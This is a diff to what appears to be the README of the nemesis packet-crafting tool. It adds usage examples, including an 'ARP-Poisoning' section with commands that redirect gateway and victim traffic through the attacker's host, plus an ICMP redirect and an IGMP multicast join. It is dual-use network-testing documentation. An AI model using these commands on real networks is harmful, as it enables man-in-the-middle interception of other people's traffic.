@@ -48,10 +48,32 @@ Send ARP packet through device `ne0` (eg. my OpenBSD pcmcia nic) from
 hardware source address 00:01:02:03:04:05 with IP source address
 10.11.30.5 to destination IP address 10.10.15.1 with broadcast
 destination hardware address. In other words, who-has the mac address of
-10.10.15.1, tell 10.11.30.5 - assuming 00:01:02:03:04:05 is the source
+10.10.15.1, tell 10.11.30.5 -- assuming 00:01:02:03:04:05 is the source
 mac address of our `ne0` device:
 
-    nemesis arp -v -d ne0 -H 0:1:2:3:4:5 -S 10.11.30.5 -D 10.10.15.1
+    nemesis arp -v -d ne0 -H 0:1:2:c0:ff:ee -S 10.11.30.5 -D 10.10.15.1
+
+### ARP-Poisoning
+
+Setup `gateway --> me --> victim` traffic redirect (poison gateway's ARP
+table):
+
+    nemesis arp -v -r -d eth0 -S victim -D gateway -h myMAC
+
+Setup `victim --> me --> gateway` traffic redirect (poison victim's ARP
+table):
+
+    nemesis arp -v -r -d eth0 -S gateway -D victim -h myMAC
+
+and more:
+
+    nemesis arp -v -S 10.0.0.1 -D 10.0.1.2 -H 0:1:2:3:4:5 -h de:ad:be:ef:0:0 -M 00:60:b0:cd:5c:c0 -m 00:60:b0:cd:5c:c0 -d eth0 -T
+    
+    nemesis icmp -S 10.10.10.3 -D 10.10.10.1 -G 10.10.10.3 -i 5
+
+Join a multicast stream (example from Bluewin TV Enviroment)
+
+    nemesis igmp -v -p 22 -S 192.168.1.20 -i 239.186.39.5 -D 239.186.39.5
 
 
 Documentation
